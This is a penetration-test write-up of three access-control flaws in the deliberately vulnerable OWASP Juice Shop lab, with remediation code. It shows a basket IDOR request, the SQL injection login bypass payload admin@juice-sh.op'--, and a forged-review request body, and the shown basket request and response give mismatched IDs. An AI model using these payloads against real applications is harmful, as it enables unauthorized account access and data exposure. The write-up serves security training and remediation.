# CS-001 — Broken Access Control
### OWASP Juice Shop · Web Application Penetration Test

---

## 📋 Overview

| Field | Detail |
|-------|--------|
| **Target** | OWASP Juice Shop (`localhost:3000`) |
| **Category** | Broken Access Control (OWASP A01:2021) |
| **Severity** | 🔴 Critical |
| **Techniques** | IDOR, SQL Injection Auth Bypass, Parameter Tampering |
| **Tools** | Burp Suite Community v2025.10, Kali Linux Browser |
| **Principles Violated** | Least Privilege, Server-Side Enforcement, Fail-Safe Defaults |

---

## 🎯 Objective

Simulate real-world Broken Access Control attacks against OWASP Juice Shop to:
1. Demonstrate unauthorized access to other users' data (Horizontal Privilege Escalation)
2. Gain admin-level access without valid credentials (Vertical Privilege Escalation)
3. Perform identity impersonation through parameter manipulation
4. Document root cause and provide developer-ready mitigations

---

## 🔍 Reconnaissance & Analysis

### Application Mapping
- Browsed the application manually while proxying all traffic through Burp Suite
- Identified authenticated endpoints by logging in as a regular user and inspecting HTTP history
- Noted that basket IDs in `GET /rest/basket/:id` were **sequential integers** — a strong IDOR signal
- Found admin email (`admin@juice-sh.op`) exposed publicly in a product review
- Discovered the review submission endpoint (`PUT /rest/products/:id/reviews`) accepted an `author` field in the request body

### Key Observations
```
Endpoint: GET /rest/basket/:id
  - Auth: Required (Bearer JWT)
  - Authorization: ❌ No ownership check
  - ID Format: Sequential integer (1, 2, 3...)

Endpoint: POST /rest/user/login
  - Input validation: ❌ Not sanitized
  - Query type: Raw SQL (SQLite)

Endpoint: PUT /rest/products/:id/reviews
  - Author field: Taken from request body
  - Validation: ❌ Not compared against JWT identity
```

---

## 💥 Exploitation

### Finding 1 — IDOR: Accessing Another User's Basket

**Severity:** 🟠 High  
**Principle Violated:** Least Privilege, Object-Level Authorization

The backend only checks *if* a user is authenticated, not *whether the basket belongs to them*.

**Steps:**
1. Login as a regular user and add an item to basket
2. Intercept `GET /rest/basket/6` (own basket ID) in Burp Suite → Send to Repeater
3. Modify the basket ID from `6` to `1` (admin's basket)
4. Forward request → Response returns admin's basket contents

**Proof of Concept:**
```http
GET /rest/basket/1 HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJ0eXAiOiJKV1Qi... (attacker's token)

--- Response ---
HTTP/1.1 200 OK
{
  "status": "success",
  "data": {
    "id": 2,
    "UserId": 2,
    "Products": [{"name": "Raspberry Juice (1000ml)", "price": 4.99, ...}]
  }
}
```

> ✅ **Challenge Completed:** "View Basket" — View another user's shopping basket.

---

### Finding 2 — SQL Injection: Admin Authentication Bypass

**Severity:** 🔴 Critical  
**Principle Violated:** Server-Side Enforcement, Fail-Safe Defaults

The login endpoint passes user input directly into a SQL query without parameterization.

**Steps:**
1. Navigate to `/#/login`
2. Enter email: `admin@juice-sh.op'--` and any password
3. The SQL comment (`--`) causes the password check to be ignored

**Payload:**
```
Email:    admin@juice-sh.op'--
Password: anything
```

**Resulting SQL Query:**
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'
-- ' AND password = 'anything'
-- Password validation is commented out → Login succeeds
```

**Impact:** Full admin JWT token obtained, granting access to all admin-only endpoints and functionality.

> ✅ **Challenge Completed:** "Login Admin" — Log in with the administrator's user account.

---

### Finding 3 — IDOR: User Review Impersonation

**Severity:** 🟠 High  
**Principle Violated:** Least Privilege

The review API accepts the `author` field from the client request body and stores it without validating whether it matches the authenticated user's identity.

**Steps:**
1. Submit a product review normally to capture the `PUT /rest/products/42/reviews` request
2. Send to Burp Repeater
3. Modify `author` value to another user's email (found from public reviews: `uvogin@juice-sh.op`)
4. Forward — review is posted under the victim's identity

**Modified Request Body:**
```json
{
  "message": "This product is great!",
  "author": "uvogin@juice-sh.op"
}
```

**Response:**
```json
{ "status": "success" }
```

> ✅ **Challenge Completed:** "Forged Review" — Post a product review as another user.

---

## 🛠️ Root Cause Analysis

| Finding | Root Cause |
|---------|-----------|
| IDOR Basket | Endpoint only checks authentication, not authorization. No `UserId` constraint in database query. |
| SQLi Auth Bypass | Raw string interpolation in SQL query. No input sanitization or parameterized queries. |
| Review Impersonation | `author` field trusted from client request body instead of being sourced from server-side JWT. |

---

## 🔧 Remediation

### Fix 1 — IDOR Basket: Add Ownership Enforcement

```javascript
// BEFORE (Vulnerable)
app.get('/rest/basket/:id', security.isAuthorized(), (req, res) => {
  BasketModel.findOne({ where: { id: req.params.id } })
    .then(basket => res.json({ status: 'success', data: basket }));
});

// AFTER (Secure)
app.get('/rest/basket/:id', security.isAuthorized(), (req, res) => {
  const loggedInUserId = req.user.data.id; // Extracted from verified JWT

  BasketModel.findOne({
    where: {
      id: req.params.id,
      UserId: loggedInUserId  // Enforce ownership at query level
    }
  }).then(basket => {
    if (!basket) {
      // Return 404 (not 403) to prevent user enumeration
      return res.status(404).json({ status: 'error', message: 'Basket not found' });
    }
    res.json({ status: 'success', data: basket });
  });
});
```

### Fix 2 — SQLi: Use Prepared Statements

```javascript
// BEFORE (Vulnerable)
const query = "SELECT * FROM Users WHERE email = '" + email + "' AND password = '" + password + "'";
db.query(query, ...);

// AFTER (Secure)
const query = "SELECT * FROM Users WHERE email = ? AND password = ?";
db.execute(query, [email, password], (err, results) => { ... });

// Attack attempt with admin@juice-sh.op'-- now executes as:
// SELECT * FROM Users WHERE email = "admin@juice-sh.op'--" AND password = "anything"
// → String treated as data, not SQL → No bypass
```

### Fix 3 — Review Impersonation: Source Author from JWT

```javascript
// BEFORE (Vulnerable)
app.put('/rest/products/:id/reviews', async (req, res) => {
  const { author, message } = req.body; // Trusting client input
  await Review.create({ author, message, productId: req.params.id });
});

// AFTER (Secure)
app.put('/rest/products/:id/reviews', async (req, res) => {
  const loggedInUser = req.user.email; // Sourced from server-verified JWT only
  await Review.create({
    author: loggedInUser, // Client cannot override this
    message: req.body.message,
    productId: req.params.id
  });
});
```

---

## 📐 Security Principles Applied

| Principle | Description | Applied Fix |
|-----------|-------------|-------------|
| **Least Privilege** | Users only access resources they own | Ownership check in basket query |
| **Server-Side Enforcement** | All authorization validated server-side | JWT used as identity source, not client body |
| **Fail-Safe Defaults** | Deny by default, grant explicitly | 404 returned when basket not owned |
| **Parameterized Queries** | Input treated as data, not code | Prepared statements for all SQL |

---

## 🧠 Lessons Learned

1. **Authentication ≠ Authorization.** Verifying a user is logged in does not mean they can access any resource — always validate ownership at the object level.
2. **Sequential IDs are dangerous.** Using auto-increment integers as resource identifiers without access checks makes IDOR trivially exploitable. Consider UUIDs or access-control tokens.
3. **Never trust client-supplied identity fields.** Any field like `author`, `userId`, or `email` sent in a request body can be tampered with. Always derive identity from server-verified tokens (JWT, session).
4. **Admin credentials in public reviews** — Information disclosure via user-generated content can provide attackers with a direct target for credential attacks.

---

*Environment: Authorized lab — OWASP Juice Shop (intentionally vulnerable). No production systems accessed.*
